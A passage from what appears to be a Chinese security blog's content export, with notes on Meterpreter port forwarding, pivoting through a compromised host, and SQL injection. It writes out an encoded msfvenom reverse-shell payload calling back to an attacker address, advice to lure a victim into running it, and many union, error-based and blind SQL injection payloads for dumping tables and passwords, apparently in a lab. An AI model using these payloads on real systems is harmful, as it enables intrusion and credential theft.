connectport=4455</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 端口 </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口转发和映射</title>
      <link href="/2022/03/29/port/"/>
      <url>/2022/03/29/port/</url>
      
        <content type="html"><![CDATA[<h1 id="端口转发和映射"><a href="#端口转发和映射" class="headerlink" title="端口转发和映射"></a>端口转发和映射</h1><pre class=" language-Linux"><code class="language-Linux">承接上文（pivotiing和自动路由）sessions -i 1portfwd flush  //清空portfwd add -L 192.168.3.134 -l 2020 -p 80 -r 172.16.1.103</code></pre><p><img src="/2022/03/29/port/image-20220329100405149.png" alt="image-20220329100405149"></p><p>然后通过浏览器浏览192.168.3.134:2020就可以访问内网了</p><pre class=" language-Linux"><code class="language-Linux">portfwd flushportfwd add -l 5555 -p 3389 -r 172.16.1.103然后另开一个窗口 rdesktop 127.0.0.1:5555</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pivotiing和自动路由</title>
      <link href="/2022/03/29/pivotiing/"/>
      <url>/2022/03/29/pivotiing/</url>
      
        <content type="html"><![CDATA[<h1 id="Pivotiing和自动路由"><a href="#Pivotiing和自动路由" class="headerlink" title="Pivotiing和自动路由"></a>Pivotiing和自动路由</h1><p>黑客（192.168.3.134）———-（192.168.3.133）server1（172.16.1.101）———-（172.16.1.102）server2</p><blockquote><p>创建一个木马</p></blockquote><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.3.134 lport=4444 -a x86 --platform windows -b "\x00\xff" -e x86/shikata_ga_nai -f exe > msf.exe引诱对方下载python -m SimpleHTTPServer 1234 </code></pre><p>打开msfconsole</p><pre class=" language-Linux"><code class="language-Linux">use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lport 4444set lhost 192.168.3.134exploit</code></pre><p>目标运行msf文件，就上线了</p><pre class=" language-Linux"><code class="language-Linux">run get_local_sunets   \\收集信息，查看网段run autoroute -s 172.16.1.0/24 \\设置静态路由run post/windows/gather/arp_scanner RHOSTS=172.16.1.0/24  \\扫描网段backgroudsessions</code></pre><p>使用另一个模块</p><pre class=" language-Linux"><code class="language-Linux">use auxiliary/server/socks_proxyshow optionsset srvhost 127.0.0.1set srvport 10044sett version 4arun</code></pre><p>另开一个窗口</p><pre class=" language-Linux"><code class="language-Linux">nano /etc/proxychains4.conf在里面最后一行加上socks4 127.0.0.1 10044保存退出然后就可以通过proxychains firefox访问内网了也可以使用nmap扫描</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/05/13/Vulnstack-ATT-CK-1/">Vulnstack红日内网渗透靶场1实战</a></li><li><a href="http://broken-year.github.io/2022/03/31/domain-security/">域内安全</a></li><li><a href="http://broken-year.github.io/2022/03/31/move/">域内纵向移动和横向移动</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2022/03/26/sql-injection/"/>
      <url>/2022/03/26/sql-injection/</url>
      
        <content type="html"><![CDATA[<h1 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h1><h3 id="sql语法"><a href="#sql语法" class="headerlink" title="sql语法"></a>sql语法</h3><pre class=" language-sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//查看数据库</span><span class="token keyword">use</span> <span class="token punctuation">[</span>数据库库名<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//查看库中有几张表</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> table1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//查看table1中所有数据</span><span class="token keyword">union</span> 联合<span class="token comment" spellcheck="true">//左边右边同时执行</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> table1 <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果左边出错，就执行右边</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> table1 <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> table1 <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'x'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>\转义字符：会把后面第一个字符当做字符串x\' <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">=</span> 字符串x'注释符 <span class="token comment" spellcheck="true">--空格  /**/ #</span><span class="token keyword">limit</span> 限制<span class="token keyword">limit</span> <span class="token punctuation">[</span>从哪个开始<span class="token punctuation">]</span><span class="token punctuation">[</span>输出几个<span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>&#x3D;&#x3D;注意！&#96;&#96;反引号非常重要！！！以后写数据库语句的时候，最好用反引号，反引号修饰表名，列名&#x3D;&#x3D;</p><h3 id="get型注入步骤"><a href="#get型注入步骤" class="headerlink" title="get型注入步骤"></a>get型注入步骤</h3><p>1.推断数据库语法大概是什么</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">[</span>某个表<span class="token punctuation">]</span> <span class="token keyword">WHERE</span> id <span class="token operator">=</span><span class="token punctuation">[</span>参数<span class="token punctuation">]</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span></code></pre><p>2.让他报错，显示自己的闭合方式</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">[</span>某个表<span class="token punctuation">]</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'2\'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//闭合方式有' " ') ") 或者没有闭合</span></code></pre><p>3.验证目标的闭合方式</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">[</span>某个表<span class="token punctuation">]</span> <span class="token keyword">WHERE</span> id <span class="token operator">=</span> <span class="token string">'2'</span> <span class="token comment" spellcheck="true">--+ ' limit 0,1;</span></code></pre><p>如果闭合成功，闭合凡是你所想的</p><p>4.确定一下有多少个列</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">[</span>某个表<span class="token punctuation">]</span> <span class="token keyword">WHERE</span> id <span class="token operator">=</span> <span class="token string">'2'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment" spellcheck="true">--+ limit 0,1;</span></code></pre><p>不报错，所以有3列</p><p>5.使用联合查询，因为推断出有3列，所以union select1,2,3前面的参数必须出错，不然后面的1,2,3报错位显示不出来</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">2</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>出现报错位，分别为2,3</p><p>6.开始刺探内部内容</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">2</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>输出数据库库名为security  还可以输出version()，user()</p><p>information_schema是自带的，相当于数据库户口本</p><p>information_schema的tables保存着所有数据库库名和表名的对应关系</p><p>information_schema的columns保存着库名–表名–列名所有对对应关系</p><p>输出表名</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">2</span><span class="token string">' union select 1,table_name,3 from information_schema.tables where table_schema='</span>security' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token comment" spellcheck="true">--+ 修改limit后面参数</span>还有一种是用group_concatid<span class="token operator">=</span><span class="token operator">-</span><span class="token number">2</span><span class="token string">' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='</span>security'<span class="token comment" spellcheck="true">--+</span></code></pre><p>7.查询表中的列</p><pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">2</span><span class="token string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>users'<span class="token comment" spellcheck="true">--+</span></code></pre><p>8.联合内容</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment" spellcheck="true">--+</span></code></pre><h3 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h3><p>猜测源码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$u</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>select username<span class="token punctuation">,</span>password from table1 where username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"$u"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> password<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"$p"</span><span class="token punctuation">)</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>select username<span class="token punctuation">,</span>password from table1 where username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"\") and password=("</span>"<span class="token punctuation">)</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span></code></pre><p>判断闭合方式</p><pre class=" language-sql"><code class="language-sql">\' <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> table1 <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true"># ' and password='$p'limit 0,1;</span><span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> table1 <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#</span><span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> table1 <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment" spellcheck="true"># ' and password='$p' limit 0,1;</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#</span></code></pre><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> table1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//计算多少条数据</span><span class="token keyword">select</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//生成随机数</span><span class="token keyword">select</span> floor<span class="token punctuation">(</span><span class="token number">1.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//向下取整，1.2会出来1</span><span class="token keyword">select</span> floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//生成0/1随机数</span><span class="token keyword">select</span> floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取一个别名</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> table1 <span class="token keyword">group</span> <span class="token keyword">by</span> id<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//以id分组</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//字符拼接</span><span class="token keyword">select</span> password<span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">as</span> num <span class="token keyword">from</span> table1 <span class="token keyword">group</span> <span class="token keyword">by</span> password<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//统计不同密码有多少个，统计数据命名为num，顺便对password进行分组</span><span class="token number">0x3a</span> <span class="token operator">=</span> :<span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token string">'haha'</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token string">'nihao'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出haha:nihao</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出结果是 ::库名::</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">;</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">;</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token punctuation">;</span>mysql官方说: rand函数每次出现都会重新计算一次<span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//group by a是按a排序,a里面只有0,1，并且随机 总有一天出现2个0,2个1，就会报错</span></code></pre><p>实战：</p><pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema='</span>security' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token number">0x7365637572697479</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+ //hex不用加任何东西</span><span class="token comment" spellcheck="true">//简单高效的办法</span>' <span class="token operator">AND</span> extractvalue<span class="token punctuation">(</span><span class="token boolean">null</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span></code></pre><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h4><p>boolean True&#x2F;False</p><p>不显示数据，也不显示数据库</p><p>小知识：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//数据库 库名</span><span class="token keyword">select</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//库名的长度</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//从第一个字开始取1个并转换成ascii</span><span class="token keyword">select</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">104</span><span class="token punctuation">;</span></code></pre><p>实战：</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">115</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span></code></pre><h4 id="布尔型时间盲注"><a href="#布尔型时间盲注" class="headerlink" title="布尔型时间盲注"></a>布尔型时间盲注</h4><p>界面上完全没有反应，但是你觉得可以注入</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//睡5s后输出0</span><span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> datadase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">"haha"</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" 